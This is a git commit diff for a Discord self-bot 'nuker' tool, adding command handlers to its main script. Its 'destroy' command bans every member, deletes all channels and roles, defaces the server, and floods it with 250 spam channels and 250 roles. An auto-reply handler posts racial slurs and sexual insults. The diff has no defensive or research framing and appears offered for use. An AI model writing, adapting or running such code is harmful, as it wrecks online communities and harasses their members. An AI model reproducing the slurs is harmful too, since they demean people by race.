b7100d1ac7370385e41d58f5e6581bc167d3ee58
Xlioxide <80074222+Xlioxide@users.noreply.github.com>
2021-03-08 01:33:10 -0500

    new

--- IoxideNukerMain/Main.py
+++ IoxideNukerMain/Main.py
@@ -94,3 +94,100 @@ Ioxide = commands.Bot(
     command_prefix=prefix,
     self_bot=True
 )
+Ioxide.remove_command('help') 
+
+@Ioxide.event
+async def on_command_error(ctx, error):
+    error_str = str(error)
+    error = getattr(error, 'original', error)
+    if isinstance(error, commands.CommandNotFound):
+        return
+    elif isinstance(error, commands.CheckFailure):
+        print(f"{Fore.WHITE}Error: {Fore.YELLOW}You're missing permission to execute this command"+Fore.RESET)
+    elif isinstance(error, commands.MissingRequiredArgument):
+        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Missing arguments: {error}"+Fore.RESET)
+    elif isinstance(error, numpy.AxisError):
+        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Not a valid image"+Fore.RESET)
+    elif isinstance(error, discord.errors.Forbidden):
+        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Discord error: {error}"+Fore.RESET)
+    elif "Cannot send an empty message" in error_str:
+        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Couldnt send a empty message"+Fore.RESET)               
+    else:
+        print(f"{Fore.WHITE}Error: {Fore.YELLOW}{error_str}"+Fore.RESET)
+
+@Ioxide.event
+async def on_message_edit(before, after):
+    await Ioxide.process_commands(after)
+
+@Ioxide.event
+async def on_message(message):
+    responses = ["what nigga", "shut up and focus son", "nigga im right here lmfao", "sybau and focus on gettin blazed","I got 2 dicks in my ass and u still cant pack me. fuck up nigga"]
+    nums = [1, 1.3, 1.5, 2, 2.3, 2.6, 3, 3.8, 5, 4, 6, 7]
+    ptime = random.choice(nums)
+    ## Begin Long Annoying Anti-AFK Checking..
+    if 'afk c' in message.content:
+        if anti_afk == True:
+                try:
+                    randomResponses = random.choice(responses)
+                    msg = randomResponses
+                    time.sleep(ptime)
+                    await message.channel.send(msg)
+                except discord.errors.Forbidden:
+                    print(""
+                    f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)
+    elif 'AFK C' in message.content:
+        if anti_afk == True:
+            try:
+                randomResponses = random.choice(responses)
+                time.sleep(ptime)
+                msg = randomResponses
+                await message.channel.send(msg)
+            except discord.errors.Forbidden:
+                print(""
+                f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)
+
+    elif 'AFK c' in message.content:
+        if anti_afk == True:
+            try:
+                randomResponses = random.choice(responses)
+                time.sleep(ptime)
+                msg = randomResponses
+                await message.channel.send(msg)
+            except discord.errors.Forbidden:
+                print(""
+                f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)
+        return
+@Ioxide.command(aliases=['serverdestroy','ruinserver','doafredo'])
+async def destroy(ctx):
+    await ctx.message.delete()
+    for user in list(ctx.guild.members):
+        try:
+            await user.ban()
+        except:
+            pass
+    for channel in list(ctx.guild.channels):
+        try:
+            await channel.delete()
+        except:
+            pass
+    for role in list(ctx.guild.roles):
+        try:
+            await role.delete()
+        except:
+            pass
+    try:
+        await ctx.guild.edit(
+            name=RandString(),
+            description="get fucked by ioxide LOL",
+            reason="cuz ioxideW nigga",
+            icon=None,
+            banner=None
+        )
+    except:
+        pass
+    for _i in range(250):
+        await ctx.guild.create_text_channel(name="ioxide nuked u lol")
+    for _i in range(250):
+        await ctx.guild.create_role(name="ioxideW", color=RandomColor())
+
+
